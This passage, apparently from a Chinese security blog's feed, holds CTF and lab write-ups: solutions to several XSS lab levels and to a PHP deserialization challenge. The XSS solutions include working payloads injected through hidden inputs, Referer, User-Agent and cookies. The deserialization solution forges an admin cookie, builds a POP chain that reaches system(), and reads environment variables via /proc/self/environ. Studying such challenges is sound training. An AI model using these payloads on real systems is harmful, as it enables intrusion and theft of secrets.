class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>emmm，表单隐藏起来了呀，小问题，这不是可以GET传参嘛</p><p>传了个<code>&quot; onclick=&#39;javascript:alert(1)&#39;</code>，唉呦吼吼，忘记了，表单隐藏了，所以没法点击，想了个办法，但是感觉是非预期解吧。。就是开开发者工具修改网页代码，把type属性删掉，过是过了，但是好蠢www，去网上看了下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">?keyword=nul&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)<br></code></pre></td></tr></table></figure><p>这里input标签内将会出现两个type属性，浏览器通常会判定第一个出现的值作为最终的值</p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先看参数t_sort，想通过覆盖type属性的值就要闭合双引号，就会被转义，是行不通的，那就通过t_ref参数，修改ref头来进行xss</p><p><img src="/2023/02/09/XSS/image-20230726002207122.png"></p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><p>同上，换成了ua</p><p><img src="/2023/02/09/XSS/image-20230726004036006.png"></p><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><p>同上，换成了cookie</p><p><img src="/2023/02/09/XSS/image-20230726004718763.png"></p><h3 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h3><p>题目出问题了，做不了</p><h3 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>ng-include</code>:这玩意类似于php的include，文件包含</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-number">1</span>、ng-<span class="hljs-meta"><span class="hljs-keyword">include</span> 指令用于包含外部的 HTML文件。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">2、包含的内容将作为指定元素的子节点。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">3、ng-<span class="hljs-keyword">include</span> 属性的值可以是一个表达式，返回一个文件名。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">4、默认情况下，包含的文件需要包含在同一个域名下。</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">特别值得注意的几点如下：</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">1.ng-<span class="hljs-keyword">include</span>,如果单纯指定地址，必须要加引号</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">2.ng-<span class="hljs-keyword">include</span>,加载外部html，script标签中的内容不执行</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">3.ng-<span class="hljs-keyword">include</span>,加载外部html中含有style标签样式可以识别</span><br><span class="hljs-meta"></span><br></code></pre></td></tr></table></figure><p>所以可以包含同样存在xss漏洞的level1：</p><p>payload:</p><p>因为不执行script标签内容，所以这里使用伪协议或者<code>&lt;img&gt;</code>标签</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">?src=<span class="hljs-string">&#x27;level1.php?name=&lt;a href=&#x27;</span><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&#x27;&gt;xss&lt;/a&gt;&#x27;</span><span class="hljs-comment">//错误的，自己看着点单双引号</span><br>?src=<span class="hljs-string">&#x27;level1.php?name=&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;&#x27;</span><span class="hljs-comment">//正确的</span><br>?src=<span class="hljs-string">&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)/&gt;&#x27;</span><span class="hljs-comment">//错误的，不要加&#x27;/&#x27;</span><br>?src=<span class="hljs-string">&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><span class="hljs-comment">//正确的</span><br></code></pre></td></tr></table></figure><h3 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;<br></code></pre></td></tr></table></figure><p>不让用script?那就用<code>&lt;img&gt;</code>，空格过滤？那么多绕过姿势</p><p>payload:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;img<span class="hljs-variable">%0</span>asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>aonerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br>&lt;img<span class="hljs-variable">%0</span>csrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>conerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br>&lt;img<span class="hljs-variable">%0</span>dsrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>donerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化</title>
    <link href="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="2023-HZNUCTF-ppppop"><a href="#2023-HZNUCTF-ppppop" class="headerlink" title="2023 HZNUCTF ppppop"></a>2023 HZNUCTF ppppop</h2><p>打开页面发现什么也没有，hackbar查看Cookie发现存在Cookie</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Cookie=Tz<span class="hljs-meta">o0</span>OiJ<span class="hljs-attr">Vc2</span>VyIjoxO<span class="hljs-symbol">ntzOjc6</span>ImlzQWRtaW<span class="hljs-number">4</span>i<span class="hljs-meta">O2</span>I<span class="hljs-number">6</span>MDt<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p>base64解码后得到一串序列化数据</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;User&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;isAdmin&quot;</span>;b:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>b的值为0，尝试将b改为1伪造admin用户登录，进入网页，显示网页源码高亮：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;utils.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">checkUser</span>()) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]));<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>php反序列化，审计本题就是想通过类A来调用某个类的某个方法。</p><p>编写poc验证漏洞:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$className</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcName</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;className;<br>        <span class="hljs-variable">$funcName</span> = <span class="hljs-variable language_">$this</span>-&gt;funcName;<br>        <span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$arg</span></span>) </span>&#123;<br>        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><span class="hljs-variable">$a</span>-&gt;className = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$a</span>-&gt;funcName = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;args = <span class="hljs-string">&quot;calc.exe&quot;</span>;<br><br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230404125943007.png"></p><p>执行calc.exe，说明存在漏洞。更改$a-&gt;args的值，发现flag存在于环境变量中：</p><p>$a-&gt;args &#x3D; “env”;</p><p>(Linux的环境变量也可以通过查看根目录下文件&#x2F;proc&#x2F;self&#x2F;environ：$a-&gt;args &#x3D; “cat &#x2F;proc&#x2F;self&#x2F;environ”)</p><p>POST传入</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload=fTsid<span class="hljs-name">m5</span>lIjozO<span class="hljs-symbol">nM7</span>I<span class="hljs-symbol">nNncmEiOjQ6</span>czsibWV<span class="hljs-number">0</span>c<span class="hljs-number">3</span>lzIj<span class="hljs-meta">o2</span>O<span class="hljs-symbol">nM7</span>ImVtYU<span class="hljs-number">5</span>jb<span class="hljs-symbol">nVmIjo4</span>O<span class="hljs-symbol">nN9</span>ezowOiJCIjoxOk<span class="hljs-number">87</span>ImVtYU<span class="hljs-number">5</span>zc<span class="hljs-number">2</span>FsYyI<span class="hljs-number">6</span>OTpzezozOiJBIjoxOk<span class="hljs-number">8</span>=<br></code></pre></td></tr></table></figure><p>本题顺便复习了下___call()以及___destruct()魔术方法的使用方法：</p><h3 id="call"><a href="#call" class="headerlink" title="__call():"></a>__call():</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-variable">$method</span>,<span class="hljs-variable">$arg_array</span>);<span class="hljs-comment">//调用一个未定义的方法的时候调用。当调用当前对象不存在的方法时，转向__call()</span><br></code></pre></td></tr></table></figure><p>也就是说，如果test()方法未定义，那么testzhege方法就会作为___call()的第一个参数传入，而test的参数会被装进数组中作为___call()的第二个参数传入。所以当调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$foo</span>-&gt;<span class="hljs-title function_ invoke__">test</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-number">3.4</span>,<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><p>时，实际是相当于调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$foo</span>-&gt;<span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-number">3.4</span>,<span class="hljs-literal">true</span>));<br></code></pre></td></tr></table></figure><p>本题中B类中$funcName未定义，那么在A类中调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br></code></pre></td></tr></table></figure><p>时，A::$funcName就会被传入B类__call()中的$func，A::$args传入B类的$arg，而$arg[0]就是字符串”calc.exe”。</p><p>在B中转向执行__call()也就是B::$func(B::arg[0]);也就是system(“calc.exe”);</p><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct():"></a>__destruct():</h3><p>类的析构函数，在销毁一个类之前执行一些操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#声明格式：</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">//TODO</span><br>&#125;<br><span class="hljs-comment">#注意：析构函数不能带有任何参数</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#举例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$sex</span>=<span class="hljs-string">&quot;男&quot;</span>,<span class="hljs-variable">$age</span>=<span class="hljs-number">22</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;sex=<span class="hljs-variable">$sex</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(<span class="hljs-params"></span>)#构造说话方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我叫：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;，性别：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;sex.<span class="hljs-string">&quot;，年龄：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)#声明一个析构方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我觉得我还可以再抢救一下，我的名字叫&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小明&quot;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$Person</span>);<span class="hljs-comment">//销毁上面创建的对象$Person</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#我觉得我还可以再抢救一下，我的名字叫小明</span><br></code></pre></td></tr></table></figure><h3 id="construct"><a href="#construct" class="headerlink" title="__construct():"></a>__construct():</h3><p>构造函数，使用new关键字实例化一个对象的时候构造函数自动调用。一个类中只能存在一个构造函数。与析构函数不同的是__construct()可以带有参数（可选，不需要时可以省略），如果构造函数有参数的话，在实例化对象时也要传入对应的参数，例如上述destruct()方法示例中的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小明&quot;</span>);<br><span class="hljs-comment">//也可以将上例中的__construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=22)参数的值进行修改，随意改，最终参数的值只看实例化传入的，</span><br><span class="hljs-comment">//例如构造函数声明和类Person实例化如下：</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$sex</span>=<span class="hljs-string">&quot;男&quot;</span>,<span class="hljs-variable">$age</span>=<span class="hljs-number">22</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;sex=<span class="hljs-variable">$sex</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>    &#125;<br>......<br><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小红&quot;</span>,<span class="hljs-string">&quot;女&quot;</span>，<span class="hljs-number">23</span>);<br>......<br><span class="hljs-comment">//则最后运行结果为</span><br><span 